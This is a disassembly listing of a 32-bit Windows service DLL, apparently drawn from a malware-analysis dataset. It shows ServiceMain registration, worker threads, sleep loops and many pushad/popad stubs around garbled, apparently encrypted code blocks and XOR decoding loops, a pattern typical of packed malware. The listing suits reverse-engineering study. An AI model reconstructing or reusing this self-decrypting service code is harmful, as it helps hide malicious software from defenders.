mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_100047c0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
mov dl [ ebx + ecx ]
test dl dl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
sub_10004820
push ebp
mov ebp esp
push 0xffffffff
push sub_100167c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] eax
mov edx edx
pushad
inc edi
mov esp esp
dec edi
push 0x6
call sub_10005f66
popad
out 0xa4 eax
jecxz r-xdata
dec [ esi - 0x16b056bc ]
mov esp ebp
inc [ eax ]
add ch 0x3
xchg [ edi + 0x4c8e1b75 ] bh
test eax 0xf299e950
inc [ eax ]
add ch 0x3
xchg [ edi + 0x548e0b75 ] bh
test eax 0xefa9e951
inc [ eax ]
add ch 0x4
mov edx edx
pushad
push ecx
mov ebx ebx
pop ecx
push 0x1
call sub_100060f3
popad
mov eax eax
pushad
inc esp
jmp r-xdata
dec esp
push 0x2
call sub_10005f66
popad
mov ah 0x6c
mov [ edi - 0x40 ] 0xe6c6c6b
leave
inc ebp
sub_100048c3
sub [ 0x47c77623 ] bh
enter 0x2241 0x41
add cl cl
inc ebp
into
imul ebp [ esi + 0x6a ] 0xd047c70b
cmp eax 0xc974413c
inc ebp
salc
aas
and al 0x3f
add al bh
inc edi
fsubr [ ebx + 0x6c ]
insb
sub ecx ecx
inc ebp
fidivr [ esi ]
jbe r-xdata
add [ edx + 0x5cd80774 ] al
and al 0x66
leave
inc ebp
loop r-xdata
xor bl bl
lea eax [ ebp - 0x40 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
inc eax
test eax edi
or esi [ ebp - 0x9 ]
xor eax edx
lea ecx [ ebx ]
xor [ edi + eax - 0x1c ] 0x5c
inc eax
test eax edi
or esi [ ebp - 0xb ]
mov ebp ebp
pushad
push edx
mov eax eax
pop edx
push 0x2
call sub_100060f3
popad
mov eax [ ebp - 0x54 ]
cmp [ ebp - 0x58 ] eax
je r-xdata
add al bh
inc edi
in al 0x6b
insb
insb
sub cl cl
inc ebp
0x243f762a 0xc966
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x54 ]
push ecx
push edx
mov eax esi
call sub_10004420
push esi
call sub_10009140
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp - 0x58 ]
sub eax edx
add ebx 0x18
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] ebx
mov esi edi
cmp edi [ ebp - 0x48 ]
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov esi [ ebp - 0x48 ]
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
lea ecx [ ecx ]
lea ecx [ ebp - 0x40 ]
cmp esi 0x4
jb r-xdata
xor eax eax
movzx ebx [ ecx ]
movzx eax [ edx ]
sub eax ebx
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x48 ]
cmp edi eax
jb r-xdata
mov ebx [ ebp - 0x44 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
xor edx edx
cmp edi eax
setne dl
mov eax edx
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov ebx [ ebp - 0x44 ]
movzx eax [ edx + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
mov eax esi
cmp esi edi
jb r-xdata
mov bl 0x1
jmp r-xdata
cmp esi 0x2
jbe r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
mov esi [ ebp - 0x58 ]
test esi esi
je r-xdata
movzx eax [ edx + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
cmp esi 0x3
jbe r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x34 ]
call sub_100046e0
test eax eax
jne r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x28 ]
call sub_100046e0
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
add ebx 0x64
lea eax [ ebx - 0x18 ]
mov [ ebp - 0x44 ] ebx
cmp eax [ ebp - 0x54 ]
jne r-xdata
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x1c ]
call sub_100046e0
test eax eax
jne r-xdata
mov edi [ ebx ]
mov eax edi
cmp eax edi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
sub_10004b70
push ebp
mov ebp esp
push 0xffffffff
push sub_10016798
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
pushad
inc ecx
mov ecx ecx
dec ecx
push 0x6
call sub_10005f66
popad
out 0x54 eax
loopne r-xdata
dec [ esi - 0x16b05ebc ]
cmp ecx ebp
inc [ eax ]
add ch 0x3
xchg [ edi + 0x4c8e1b75 ] bh
mov eax [ 0xffffffffef49e950 ]
inc [ eax ]
add ch 0x3
xchg [ edi + 0x548e0b75 ] bh
mov eax [ 0xffffffffec59e951 ]
inc [ eax ]
add ch 0x4
mov eax eax
pushad
push esp
mov ecx ecx
pop esp
push 0x1
call sub_100060f3
popad
jmp r-xdata
pushad
inc esp
mov ah ah
dec esp
push 0x2
call sub_10005f66
popad
leave
inc ebp
0x2b3f
sub_10004c0c
cmp [ 0x36cc47c7 ] edi
aaa
aaa
xor al 0xc9
inc ebp
shl [ ecx + eax * 2 + 0x22 ] cl
inc ecx
mov [ edi - 0x2c ] 0x2
mov bl 0x1d
mov [ edi - 0x48 ] 0x31d0810
leave
inc ebp
mov esi 0xb151b13
mov [ edi - 0x40 ] 0x1f041f76
enter 0xc645 0x0
leave
inc ebp
out 0x17 al
bndstx [ ebx ] bnd1
mov [ edi - 0x18 ] 0x1f760821
push 0x4ec47c7
pop ds
enter 0xf045 0x0
leave
inc ebp
ficom [ edi ]
bndstx [ edi ] bnd3
mov [ edi - 0x24 ] 0x74101421
leave
inc ebp
loop r-xdata
pop edx
inc edx
cmp edx 0xc
ja r-xdata
add al 0x1f
add dh [ ebx ]
retn 0x9d8d
xor [ esi + 0x5 ] 0xba
xor eax 0x2498fc0
xor [ esi + 0x5 ] 0xe6
pop edx
inc edx
cmp edx 0xa
ja r-xdata
xor eax 0x2498fc0
xor [ esi + 0x5 ] 0xda
pop edx
inc edx
cmp edx 0xb
jne r-xdata
mov edx edx
pushad
push eax
mov esi esi
pop eax
push 0x2
call sub_100060f3
popad
mov eax [ ebp - 0x5c ]
cmp [ ebp - 0x60 ] eax
je r-xdata
xor bl bl
lea eax [ ebp - 0x38 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x5c ]
push ecx
push edx
mov eax esi
call sub_10004420
push esi
call sub_10009140
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp - 0x60 ]
sub eax edx
add ebx 0x18
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x50 ] ebx
mov esi edi
cmp edi [ ebp - 0x4c ]
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov esi [ ebp - 0x4c ]
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
lea ecx [ ecx ]
lea ecx [ ebp - 0x38 ]
cmp esi 0x4
jb r-xdata
xor eax eax
movzx ebx [ ecx ]
movzx eax [ edx ]
sub eax ebx
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
lea eax [ ebp - 0x48 ]
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x4c ]
cmp edi eax
jb r-xdata
mov ebx [ ebp - 0x50 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
xor edx edx
cmp edi eax
setne dl
mov eax edx
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov ebx [ ebp - 0x50 ]
movzx eax [ edx + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
mov eax esi
cmp esi edi
jb r-xdata
mov bl 0x1
jmp r-xdata
cmp esi 0x2
jbe r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
mov esi [ ebp - 0x60 ]
test esi esi
je r-xdata
movzx eax [ edx + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
cmp esi 0x3
jbe r-xdata
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x1 ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x48 ]
call sub_100046e0
test eax eax
jne r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x1c ]
call sub_100046e0
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
add ebx 0x64
lea eax [ ebx - 0x18 ]
mov [ ebp - 0x50 ] ebx
cmp eax [ ebp - 0x5c ]
jne r-xdata
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x28 ]
call sub_100046e0
test eax eax
jne r-xdata
mov edi [ ebx ]
mov eax edi
cmp eax edi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
sub_10004c6c
add [ edx ] al
add [ edx ] al
xor [ esi + 0x5 ] 0xca
pop edx
inc edx
cmp edx 0xc
ja r-xdata
xor eax 0x2498fc0
xor [ esi + 0x5 ] 0xba
pop edx
inc edx
cmp edx 0xc
ja r-xdata
xor eax 0x2498fc0
xor [ esi + 0x5 ] 0xe6
pop edx
inc edx
cmp edx 0xa
ja r-xdata
xor eax 0x2498fc0
xor [ esi + 0x5 ] 0xda
pop edx
inc edx
cmp edx 0xb
jne r-xdata
mov edx edx
pushad
push eax
mov esi esi
pop eax
push 0x2
call sub_100060f3
popad
mov eax [ ebp - 0x5c ]
cmp [ ebp - 0x60 ] eax
je r-xdata
xor bl bl
lea eax [ ebp - 0x38 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x5c ]
push ecx
push edx
mov eax esi
call sub_10004420
push esi
call sub_10009140
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp - 0x60 ]
sub eax edx
add ebx 0x18
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x50 ] ebx
mov esi edi
cmp edi [ ebp - 0x4c ]
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov esi [ ebp - 0x4c ]
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
lea ecx [ ecx ]
lea ecx [ ebp - 0x38 ]
cmp esi 0x4
jb r-xdata
xor eax eax
movzx ebx [ ecx ]
movzx eax [ edx ]
sub eax ebx
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
lea eax [ ebp - 0x48 ]
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x4c ]
cmp edi eax
jb r-xdata
mov ebx [ ebp - 0x50 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
xor edx edx
cmp edi eax
setne dl
mov eax edx
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov ebx [ ebp - 0x50 ]
movzx eax [ edx + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
mov eax esi
cmp esi edi
jb r-xdata
mov bl 0x1
jmp r-xdata
cmp esi 0x2
jbe r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
mov esi [ ebp - 0x60 ]
test esi esi
je r-xdata
movzx eax [ edx + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
cmp esi 0x3
jbe r-xdata
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x1 ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x48 ]
call sub_100046e0
test eax eax
jne r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x1c ]
call sub_100046e0
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ ebx ]
sub eax edx
mov edi eax
mov eax esi
cmp eax esi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ebx + 0x4 ] 0x10
jb r-xdata
mov eax edi
lea edx [ ebx - 0x10 ]
mov edx [ ebx - 0x10 ]
jmp r-xdata
add ebx 0x64
lea eax [ ebx - 0x18 ]
mov [ ebp - 0x50 ] ebx
cmp eax [ ebp - 0x5c ]
jne r-xdata
cmp esi edi
jb r-xdata
lea ecx [ ebp - 0x28 ]
call sub_100046e0
test eax eax
jne r-xdata
mov edi [ ebx ]
mov eax edi
cmp eax edi
jae r-xdata
cmp esi edi
setne al
test eax eax
je r-xdata
sub_10004ed0
push ebp
mov ebp esp
push ebx
mov eax 0x1
push esi
push edi
cmp [ ebp + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] 0x0
jmp r-xdata
pushad
inc edx
mov ah ah
dec edx
push 0x2
call sub_10005f66
popad
xor al 0xc2
mov cl 0xce
lea esp [ esi + 0x2000224 ]
add [ edx ] dh
mov [ edx ] al
adc [ eax + edx ] eax
inc edx
cmp eax 0x201d6
jle r-xdata
xor cl [ eax + 0x10041102 ]
lea esi [ ebp + 0xa ]
push esi
add [ 0x100370b6 ] edx
push 0x4
add eax [ eax ]
add ch [ eax + 0x5a ]
das
add eax 0x17ff5810
test al 0x72
add [ edx ] edx
push 0x20106
push 0x60
xor eax [ ebx ]
adc dl [ esi + 0x1 ]
adc eax 0x100370b2
lea edx [ 0x100413da ]
lea ecx [ 0x1004187a ]
xor eax 0x76d287c0
jg 0x420075c5
mov dl bl
adc al [ eax + edx ]
inc edx
cmp eax esp
jne r-xdata
ficom [ edx ]
add al 0x10
mov edx [ edi ]
loopne r-xdata
adc [ edx + 0x3b ] al
les esi [ ebp - 0x9 ]
add dl [ edx ]
mov ecx [ edi ]
js r-xdata
add dl [ edx ]
mov ecx [ edi ]
js r-xdata
add dl [ edx ]
add dl [ edx ]
mov ecx [ edi ]
js r-xdata
add dl [ edx ]
xor eax edx
test esp edx
je r-xdata
add dl [ edx ]
mov ecx [ edi ]
js r-xdata
add dl [ edx ]
xor eax edx
test esp edx
je r-xdata
call 0xffffffff9b1251cb
vmread [ edx ] ebx
lea ecx [ ebx ]
xor cl [ eax + 0x100414e6 ]
in al 0x17
lea ecx [ ebx ]
xor cl [ eax + 0x100413e2 ]
jmp r-xdata
add dl [ edx ]
xor eax edx
test esp edx
je r-xdata
insb
sbb al [ edx ]
adc cl [ ebx + 0x21a780f ]
adc dh [ ebx ]
retn 0xd485
lea ecx [ ebx ]
xor cl [ eax + 0x100415ea ]
inc edx
cmp eax esp
jne r-xdata
inc edx
cmp eax esp
jne r-xdata
out 0x14 al
add al 0x10
mov edx [ edi ]
loop r-xdata
mov edx [ edi ]
pop ebx
push 0x0
call sub_100060f3
popad
mov eax 0x1
pushad
push ebx
lea ecx [ ebx ]
0x42100415 0xc43b
mov edx [ edi ]
xor eax edx
test esp edx
je r-xdata
inc edx
cmp eax esp
jne r-xdata
add al 0x10
xor cl [ eax + 0x100417ee ]
inc edx
cmp eax esp
jne r-xdata
mov esp esp
sub_10005010
push ebp
mov ebp esp
sub esp 0x5f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x5ec ] eax
jmp r-xdata
pushad
push edi
jmp r-xdata
pop edi
push 0x3
call sub_10005f66
popad
imul eax [ 0xffffffff8f000201 ] 0x1fe938d
[ eax + eax + 0x53 ]
sub_100050cf
rol al 0x98
add [ edx ] edx
lea edi [ edi + 0x1ff0028 ]
[ esi ] [ edi ]
mov ecx 0x2001b
shr [ eax ] 0x99
add [ edx ] edx
lea edi [ edi - 0x6c ]
cmc
movsd [ edi ] [ esi ]
push 0x3
add eax [ eax ]
add cl [ ebp - 0xda69 ]
add [ edx + 0x2 ] ebp
push edx
enter 0x9c85 0xfe
add edi edi
add ah [ esi - 0x59 ]
mov [ edi + 0x1ffff24 ] 0x0
0x200b092 0x568
sub_100051d0
xchg ebp eax
std
add edi edi
push esp
mov [ edx ] 0x0
add esi edx
push 0xffffff98
cdq
add [ edx ] edx
lea eax [ edi + 0x1fffe20 ]
push eax
add esi edx
mov edx 0x2000304
lea ecx [ edi + 0x1ff0090 ]
test edx eax
jbe 0x120055f8
inc ebx
dec eax
ja r-xdata
mov ecx 0x20106
sub eax 0x304bac8
add [ edx ] al
sub eax ebx
push 0x100397a2
cmp [ ebx ] 0x0
jmp r-xdata
jbe r-xdata
cmp eax [ eax ]
sub_10005420
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov esi esi
pushad
inc edi
jmp r-xdata
dec edi
push 0x6
call sub_10005f66
popad
xor eax 0x4066ac0
add [ edx ] al
push eax
sub_100054ca
xchg ebp eax
idiv ch
add edi edi
push esp
call [ edi ]
fdiv [ ebx + 0x1 ]
adc al [ ebp - 0x74c88b3e ]
pop ds
lodsb [ esi ]
jb r-xdata
lea eax [ edi + 0x1fffff4 ]
push eax
xor eax 0x87d301f6
shl [ edi + 0x20 ] 0x8d
cmp eax 0x10037076
adc cl [ ebp - 0xb79 ]
add [ eax + 0x35 ] edx
test [ ecx ] 0xd3
xchg eax eax
ja r-xdata
pushad
push esi
jmp r-xdata
lea ecx [ edi + 0x1fffff4 ]
push ecx
add ebx edx
xchg eax eax
je r-xdata
mov edi edi
push 0xffffffe8
add eax 0xd9ff0200
inc esi
test esi edi
jge r-xdata
lea edi [ 0x10037076 ]
pop esi
push 0x6
call sub_100060f3
popad
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn 0x4
sub_10005540
push ebp
mov ebp esp
push 0xffffffff
push sub_1001680c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x3ff
lea eax [ ebp - 0x40f ]
push 0x0
push eax
mov [ ebp - 0x410 ] 0x0
call sub_1000ffa0
add esp 0xc
jmp r-xdata
pushad
inc ecx
jmp r-xdata
dec ecx
push 0x3
call sub_10005f66
popad
xor eax 0x8de2b3c0
push [ edx ]
mov [ edx + 0x421003d8 ] dl
cmp eax 0x20845
jle r-xdata
xor cl [ eax + 0x1003d892 ]
inc edx
mov eax eax
pushad
push ebx
mov ah ah
pop ebx
push 0xb
call sub_100060f3
popad
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push ecx
push edx
push eax
push rw-data
push r--data
mov ecx 0x400
lea edi [ ebp - 0x410 ]
call sub_10004760
mov eax edi
add esp 0x14
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
xor eax eax
lea ecx [ ebp - 0x410 ]
call sub_10002aa0
mov esi eax
call sub_10002820
test al al
je r-xdata
test esi esi
je r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ esi ]
push eax
call sub_10009014
mov esi [ esi + 0x4 ]
add esp 0x4
test esi esi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0xad8
call sub_1000919c
add esp 0x4
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push rw-data
call sub_100074aa
add esp 0x4
push 0xad8
mov esi eax
call sub_1000919c
add esp 0x4
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push 0x0
push eax
call sub_100010c0
jmp r-xdata
xor eax eax
push esi
push eax
call sub_100010c0
jmp r-xdata
call sub_10001270
call sub_10001d00
call sub_10004820
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov [ ebp - 0x4 ] 0xffffffff
mov ebx eax
call sub_10009014
add esp 0x4
jmp r-xdata
mov edi [ Sleep@IAT ]
call sub_10004b70
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn 0x4
cmp esi [ ebx + 0xaa4 ]
jl r-xdata
push 0x2710
inc esi
call edi
push rw-data
call sub_10005010
add esp 0x4
mov ecx ebx
call sub_10001c20
test al al
jne r-xdata
mov ecx [ ebx + 0xaa0 ]
push ecx
call edi
push 0xfa0
call edi
jmp r-xdata
xor esi esi
ServiceMain
push sub_10005980
push rw-data
call [ RegisterServiceCtrlHandlerA@IAT ]
xor ecx ecx
mov [ rw-data ] eax
cmp eax ecx
je r-xdata
retn 0x8
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov ecx [ rw-data ]
mov [ rw-data ] ecx
push rw-data
inc ecx
push eax
mov [ rw-data ] 0x10
mov [ rw-data ] 0x2
mov [ rw-data ] 0xbb8
mov [ rw-data ] ecx
call [ SetServiceStatus@IAT ]
call sub_100057e0
sub_100057e0
push ebx
push esi
xor esi esi
push esi
push esi
mov ebx 0x1
push ebx
push esi
call [ CreateEventA@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] 0x10
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
push edi
mov edi [ SetServiceStatus@IAT ]
push rw-data
push ecx
mov [ rw-data ] 0x4
call edi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] ebx
call [ SetServiceStatus@IAT ]
pop esi
pop ebx
retn
mov edx [ rw-data ]
push 0x1388
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push sub_10005540
push esi
push esi
call [ CreateThread@IAT ]
push esi
push esi
push esi
push sub_10005420
push esi
push esi
mov [ rw-data ] eax
call [ CreateThread@IAT ]
mov ecx [ rw-data ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ rw-data ]
push rw-data
push edx
mov eax [ rw-data ]
push rw-data
push eax
jmp r-xdata
mov [ rw-data ] 0x10
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] esi
call edi
pop edi
pop esi
pop ebx
retn
sub_10005900
xor ecx ecx
mov [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp eax 0x2
jne r-xdata
mov [ rw-data ] 0x1
cmp eax 0x4
je r-xdata
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] ecx
call [ SetServiceStatus@IAT ]
retn
cmp eax 0x1
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push rw-data
push eax
call [ SetServiceStatus@IAT ]
retn
sub_10005980
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push rw-data
push eax
